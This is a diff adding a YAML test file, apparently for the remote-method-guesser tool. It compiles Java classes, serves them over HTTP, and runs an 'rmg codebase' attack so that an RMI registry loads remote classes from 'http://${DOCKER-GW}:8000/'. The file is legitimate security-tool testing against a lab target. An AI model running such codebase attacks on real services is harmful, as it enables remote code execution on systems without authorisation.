@@ -1,0 +1,61 @@
+tester:
+  title: Codebase Tests
+  description: |-
+    'Performs tests for the codebase action.'
+
+  id: '003-004'
+  groups:
+    - codebase
+  id_pattern: '003-004-{:03}'
+
+
+plugins:
+  - os_command:
+      cmd:
+        - javac
+        - -source
+        - 1.8
+        - -target
+        - 1.8
+        - '../../utils/${codebase-class}1.java'
+        - '../../utils/${codebase-class}2.java'
+        - '../../utils/${codebase-class}3.java'
+        - '../../utils/${codebase-class}4.java'
+        - '../../utils/${codebase-class}5.java'
+        - '../../utils/${codebase-class}6.java'
+
+  - http_listener:
+      port: 8000
+      dir: ../../utils
+
+
+tests:
+  - title: Registry Codebase Call
+    description: |-
+      'Performs a codebase attack on the registry endpoint.'
+      'The expected result is a file being created within the docker'
+      'volume.'
+
+    command:
+      - rmg
+      - codebase
+      - ${TARGET}
+      - '${codebase-class}2'
+      - 'http://${DOCKER-GW}:8000/'
+      - --component
+      - reg
+      - ${OPTIONS}
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - Caught ClassCastException
+            - readString()
+      - file_exists:
+          invert:
+            - '${volume}/${codebase-class}2.txt'
+
+
+include:
+  - ../../shared/codebase.yml
